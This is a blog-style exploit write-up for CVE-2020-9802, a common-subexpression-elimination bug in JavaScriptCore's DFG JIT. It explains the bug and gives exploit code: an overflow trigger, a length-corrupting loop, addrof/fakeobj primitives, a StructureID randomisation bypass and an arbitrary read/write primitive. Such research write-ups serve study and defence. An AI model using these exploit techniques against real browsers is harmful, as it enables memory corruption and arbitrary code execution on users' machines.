## Credits

I'd like to be thankful to everyone in the community as a source of motivation.  
Special thanks to [Antonio](https://twitter.com/antoniofrighez) and
[Tommaso](https://twitter.com/cutesmilee__) for all the help they provided
along the way.

## Introduction

Speculative compilers are designed to produce the most efficient code possible
for a dynamic language. The core idea is to leverage the decades of
optimization research done on traditional compilers. New challenges arise with
dynamic languages because they lack type information that would otherwise make
it very easy to understand and optimize code. JavaScriptCore's speculative
compilation is made of several optimising compilers stacking on top of each
other, each one optimizing according to execution trends observed by the
preceding one. The layered architecture also makes it easy to balance the
latency/throughput tradeoff and to fine tune optimization on a per-function
basis. For instance, it would be wasteful to aggressively optimize a short
function executed a few times as it would be to interpret a hot function.

JIT bugs are some of the most complex ones that can be found in a modern
browser due to the inherent complexity of the affected component.
Despite not being beginner friendly, they are a great occasion to learn about
compilers, optimization techniques and jump start a security research project.
Their intrinsic, intricate nature, makes them hard to find both via fuzzing and
source review.

Saelo from Google Project Zero disclosed a vulnerability in WebKit's JavaScript
engine JavaScriptCore's DFG (Data Flow Graph) JIT compiler: a powerful and somewhat
esoteric bug that can be leveraged to obtain an out of bound memory access.
One of the optimization passes done by DFG, substitutes expressions incorrectly
and confuses integers that are supposed to overflow with those who do not.

## Preexisting knowledge

To learn more about speculation in JavaScriptCore the reader is advised to read
[Filip Pizlo (@filipizlo)](https://twitter.com/filipzilo)'s
[article](https://webkit.org/blog/10308/speculation-in-javascriptcore/)
published on WebKit official website.  
Moreover, [Zon8.re](https://zon8.re) did a fantastic job documenting the
inner workings of JavaScriptCore's compilation process.

## Environment Setup

Setting up a working debug build was by far the most painful part as after
being stuck for days on weird compilations errors, I was told on WebKit's Slack
channel that I didn't have the correct version of Xcode and macOS installed to
compile JavaScriptCore. I therefore decided to work on WebKitGTK on Ubuntu
machine. Readers interested in reading about a PAC bypass will be more
interested in potential future installments of this blog series where I'll
port the exploit on a \*OS platform.

The vulnerability being discussed is from 2020 and therefore requires a custom
WebKit build. Shallow cloning allows to saves some space as a large chunk of
history is truncated.

```
git clone --shallow-since="2020-03-01" git@github.com:WebKit/WebKit.git
```
In order to find the last vulnerable commit I made use of git's search feature
looking for changes to CSE's ArithNegate and checking out the parent commit
(note the use of `^` operator)

```
git checkout aed886669bd4ec3bd21ce769c3459300bada7c83^
```

## Common Subexpression Elimination

Consider the following example:

```javascript
let x = y * y + y * y
```
Performing the multiplication twice might be a inefficient, therefore it would
be optimized as such:

```javascript
let z = y * y
let x = z + z
```

This might be more efficient as `y * y` is performed only once and the value is
loaded from a register. The profiler, the component that understands and
creates an _execution profile_ for code executed frequently, keeps into account
whether it is more expensive to access memory for a value or perform the
calculation multiple times. For instance, using CSE too aggressively could put
strain onto registers, which are finite in number, which may in turn cause
values to slip onto memory and possibly cause a slowdown due to frequent memory
accesses.

### Common Subexpression Elimination in JavaScriptCore

To Clobberize:

> ~ Wikipedia

JavaScriptCore uses a clobberizer to decide which nodes are eligible for CSE.
File `Source/JavaScriptCore/dfg/DFGClobberize.h` defines how nodes are
clobberized.

Let's see for example how a given node is consumed:

```cpp
[...]
switch (node->op()) {
case JSConstant:
case DoubleConstant:
case Int52Constant:
    def(PureValue(node, node->constant()));
    return;
[...]
```
A node of type `Int52Constant` the clobberizer uses the `def()` functor to
evaluate whether the node can be CSE'd. `def()` returns [memory] locations and
they have to adhere to two rules:

1. Every path between the two nodes to be clobberized does not perform any
   write to any heap location that overlaps the desired location. To put it
   simply, if no writes are performed on a heap location defined by a node two
   things happen:

    - the two nodes satisfy condition `1`
    - the value of said location can be deduced by looking at one of the nodes

2. If a load operation is to be CSE'd, the `HeapLocation` object is
   sufficient to find the second eligible node

`PureValue` means that the result of a computation will always be the same for
a given input, in the same way in which a function is defined in mathematics
(or a pure function in computer science).

## Bug analysis 

The bug is in the `ArithNegate` case, the one used to handle the rapresentation
arithmetical negation of a number. The problem is that `def()`
does not take into account whether the number is speculated to potentially
overflow or not, thus causing incorrect substitutions between the two.

```cpp
[...]
case ArithNegate:
if (node->child1().useKind() == Int32Use
    || node->child1().useKind() == DoubleRepUse
    || node->child1().useKind() == Int52RepUse)
    def(PureValue(node));                    // incorrect
    // def(PureValue(node, node->arithMode())); correct
else {
[...]
```

Numbers that are speculated to overflow are said to be “checked”: they are
runtime guarded, to bailout optimized code when an overflow is detected.

Consider 32 bit integers as an example: `INT_MIN` is the lowest 32 bit signed
integer and is equal to `-2147483648` which in binary is
`10000000000000000000000000000000b`. Negating `INT_MIN` performes 2's
complement:

```
10000000000000000000000000000000
01111111111111111111111111111111
                              +1
---------------------------------
10000000000000000000000000000000
```

_Note: the number discussed is signed, therefore an overflow occures when bit
31st MSB is set, not the 32th_  

A JavaScript user would normally expect that `-2147483648` negated becomes
`2147483648`. An engine would normally bailout if it detects that the
program executed overflowed trying to rappresent a number out of range. 
Negating `INT_MIN` yields a number greater than `INT_MAX` `(2147483647)` and
could potentially go undetected if CSE confuses a checked intger with an unchecked one.
Morespecifically, in JavaScriptCore negating `INT_MIN` returns the following:

```
jsc >>> -2147483647|0
-2147483648
jsc >>> 2147483648|0
-2147483648
```

### Triggering the bug

_This sections analyzes Saelo's trigger, see chapter "Final thoughts" for alternatives_

The bug being discussed can be summarized as a substitution that type confuses
overflowing integers. By itself, this is only a correctness
issue and not a security one. A key mechanism to be paired with a CSE bug to
cause a security issue is IntegerRangeOptimization to remove bound checks.

The idea of IntegerRangeOptimization (or [Value Range Optimization](https://compileroptimizations.com/category/range.htm) more generally)
is removing bounds-checks considered useless.

```cpp
function f(arr, n) {
    // JavaScript type Number is float by specification, a bitwise OR
    // converts n from `float` to `int`
    n &= 0xffffffff;

    // this is the first ArithNegate
    let v = (-n) | 0xffffffff;

    if (n < 0) {
        // ArithAbs is transformed to ArithNegate during DFG's Strenght
        // Reduce Phase if n is known to be always negative
        let idx = Math.abs(n);

        if (idx > 0) {
            arr[idx];
        }
    }
}
```

`Math.abs(...)` correctly sets the node's type to `ArithMode::CheckOverflow`
and instructs the profiler about `idx` always being positive. The negation that
`Math.abs` performs is later substituted with an unchecked one.
Accessing an array at index `-2147483647` is not that useful in itself, but it
can be easily solved by causing an overflow and obtaining a positive integer.

## Exploitation

Successful exploitation consists in executing arbitrary code in an attacker
controlled memory region. This is usually done by crafting JavaScript objects
and using them to access memory locations by controlling the backing store
pointer (aka the pointer pointing to where an array writes).  

For convenience sake, attackers have used historically `ArrayBuffers`: a
datatype that allows reading and writing raw bytes. This era came to an end
when in 2018 Apple introduced the Gigacage, a security mitigation that isolates
`ArrayBuffers`'s backing store pointers in a 4GB region, rendering them
effectively useless for exploitation. Attackers have since pivoted to
`JSArrays` because their `Butterflies` store raw, non-caged, floating point
values.

In 2019 Apple introduced StructureID Randomisation in an attempt to stop
attackers from crafting objects. This mitigation proves to be rather
ineffective, as we will later see, since most out-of-bound access bugs can be
used to leak a valid StructureID.

### Memory layout initialisation

Given a constrained ability to overwrite a memory location, the first goal to
be achieved is a stable out of bound access.

Let's analyze the memory layout, which happens to be very stable.

The exploit declares a few variables necessary to construct the first primities

```javascript
[...]
 35 let noCoW = 13.37;
 36 
 37 let target = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
 38 let float_arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
 39 let obj_arr = [{}, {}, {}, {}, {}, {}, {}];
[...]
```
Note the use of `noCoW`, to prevent the creation of `CopyOnWriteArrays`
([for more on Copy-on-Write](https://en.wikipedia.org/wiki/Copy-on-write)).

This is an illustration of the memory layout of the previous code snippet

![](/assets/img/posts/cve-2020-9802/cve-2020-9802-orig.png)

The butterflies are contiguos and as such, an out of bound access may allows
access to the following ones.

### Triggering the bug

The previously discussed trigger function executed 1000 times, this is a useful
trick to increase stability by attempting triggering the bug multiple times
rather than a single shot attempt.

```javascript
 [...]
 81 const ITERATIONS = 10000000;
 82 
 83 print("[*] optimizing vulnerable function...")
 84 for (let i = 1; i <= ITERATIONS; i++) {
 85     let n = -4;
 86     if (i % 10000 == 0) {
 87         n = -2147483648;
 88     }
 89     trigger_bug(target, n);
 90     if (float_arr.length == 0x1337) {
 91         break;
 92     }
 93 }
 [...]
 ```

After the out of bound access, the memory layout changes as follows:

![](/assets/img/posts/cve-2020-9802/cve-2020-9802-corrupt.png)

`float_arr` can now index 4919 elements, 4912 of them out of the original
bound.  

For debugging purposes, the following snippet performs sanity checks and exits
in case of errors.

```javascript
[...]
 95 // check that the oob actually worked
 96 if (float_arr.length == 0x1337) {
 97     print("[+] length corruption succeeded")
 98 } else {
 99     print("[-] length corruption failed, length: " + float_arr.length)
100     throw "oob not working"
101 }
[...]
```

### Exploitation primitives: addrof & fakeobj

JIT engines exploits rely on building two fundamental
primitives: `addrof` and `fakeobj`.  _“Address of [object]”_ returns the address
of a JavaScript object, easily defeating [ASLR](). _“[Create a] fake object”_
treats a memory address as a JavaScript object.

The two primitives are built by having a float array and an object array
overlapping on a memory location.

The fundamental insight is the following: A float array stores unboxed raw
floating point values. An object array stores pointers to objects as boxed
floating point values. Both of them therefore store floating point values but
differ in their usage of them based on their indexing type `ArrayWithDouble`
`ArrayWithContiguos`.

![](/assets/img/posts/cve-2020-9802/cve-2020-9802-addrof_fakeobj.png)

Given the bug has been triggered, the two primitives are defined as follows:

``` javascript
103 const OVERLAP_OFFSET = 8;
104 
105 function raw_addrof(o) {
106   obj_arr[0] = o;
107   return float_arr[OVERLAP_OFFSET];
108 }
109 
110 function raw_fakeobj(addr) {
111   float_arr[OVERLAP_OFFSET] = addr;
112   return obj_arr[0];
113 }
```

Another sanity check used to assess the correctness of the exploit is the
following one:

```javascript
let t = {b: 42}
let a = addrof(t)

debug("[+] addrof test: \t" + hex(a));

if (fakeobj(addrof(t)) !== t) {
    throw "fakeobj not working"
} else {
    debug("[+] fakeobj test:\tpassed")
}
```

### StructureID Randomisation Bypass

Each `JSObject` has a header of type `JSCell`.  
The header looks as follows:
(file: `Source/JavaScriptCore/runtime/JSCell.h`)

```cpp
class JSCell : public HeapCell {
[...]
    StructureID m_structureID;
    IndexingType m_indexingTypeAndMisc;
    JSType m_type;
    TypeInfo::InlineTypeFlags m_flags;
    CellState m_cellState;
};
```
`m_structureID` is an identifier for an out-of-line (meaning, non inlined)
object used to describe the shape of the `JSObject`.

These shape descriptors indexed inside the `StructureIDTable`. Each valid entry
has 7 entropy bits which successfully cripple the ability to guess a valid
`StructureID`, thus making memory spraying useless for this purpose.  

This puts a novice against what seems to be a catch 22 situation:
crafting an object requires a valid StructureID, but leaking a StructureID
requires a properly constructed object.

Fortunately neither of these two assertions are true as it is possible to
**use** objects with invalid StructureIDs, and its possible to leak a
StructureID with a **semi**-faked object.

Attackers have soon after figured out possible
[strategies](https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf)
to sidestep this situation, coming up with a general bypass based on `addrof`,
`fakeobj` and JSC specific behaviour. This bypass makes use of codepaths
that don't check `StructureIDs` such as `getByVal`.

```cpp
[...]
} else if (baseValue.isObject()) {
    JSObject* object = asObject(baseValue);
    if (object->canGetIndexQuickly(i))
        return object->getIndexQuickly(i);
[...]
```

Since **`canGetIndexQuickly`** doesn't check for valid `StructureIDs` we can
create a fake object with an invalid ID and use it to read a proper one. The
header we want to leak is the one used by a `JSArray` with indexing type
`ArrayWithDouble`, so we'll create one:

```javascript
let rw_arr = [0.0, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6]
rw_arr[0] = Math.random()  // disable CopyOnWrite
```

After creating an array to leak the header from, its time to craft an object
with a custom header and butterfly:

```javascript
let jscell_header = i2f(0x0108230700000000)

let container = {
    jscell_header: jscell_header,
    butterfly: rw_arr,
}

let container_addr = addrof(container)
let fake_header_addr = container_addr + 0x10
let fake_arr = fakeobj(fake_header_addr)
```

![](/assets/img/posts/cve-2020-9802/cve-2020-9802-structureid.png)

Leaking the `StructureID` and allows having a fully controlled, properly built
`fake_arr`
```javascript
jscell_header = fake_arr[0];
container.jscell_header = jscell_header;
```
Now that the attacker controls a JavaScript object that can modify the metadata
of another one, `rw_arr` in this specific instance, they can decide where the
latter reads from and writes to:

`fake_arr[1]` sets the memory address `rw_arr` uses for reading and writing.
For example, an attacker may try use `rw_arr` to read from `0x4141414141414141`
and crashing the process at said address.

```javascript
fake_arr[1] = i2f(0x4141414141414141)
rw_arr[0]   = 1337
```

### Arbitrary read/write, arbitrary code execution

Obtaining code execution is a matter of obtaining a `RWX` memory area and
overwriting it with the desired shellcode.
Further information is left to the source code itself.

## Final thoughts and future research ideas 

The full exploit can be found on
[GitHub](https://github.com/shxdow/exploits/blob/master/CVE-2020-9802.js).  

Leaking `rwx_addr` occasionally fails and returns `0x7ff8000000000000` causing
the process to crash. Further work can be done to increase reliability.  

This article is yet another example of the dubious effectiveness of security
mitigations, as even a novice exploit developer can sidestep them with little to
no effort (`StructureID` Randomisation and Gigacage specifically). 

On a different note, whilst trying to understand the bug, I spent several days
wondering which alternatives to bounds-check elimination were feasible. This
might as well be a year long research project, but one worth pursuing.
